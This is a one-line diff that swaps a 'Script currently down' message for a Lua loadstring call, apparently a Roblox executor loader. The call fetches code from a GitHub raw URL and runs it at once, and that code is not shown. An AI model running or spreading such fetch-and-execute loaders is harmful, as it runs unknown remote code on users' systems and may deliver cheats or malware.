@@ -1,1 +1,1 @@
-Script currently down
+loadstring(game:HttpGet("https://raw.githubusercontent.com/picklespub/loader3276347627843423423/main/loader", true))()
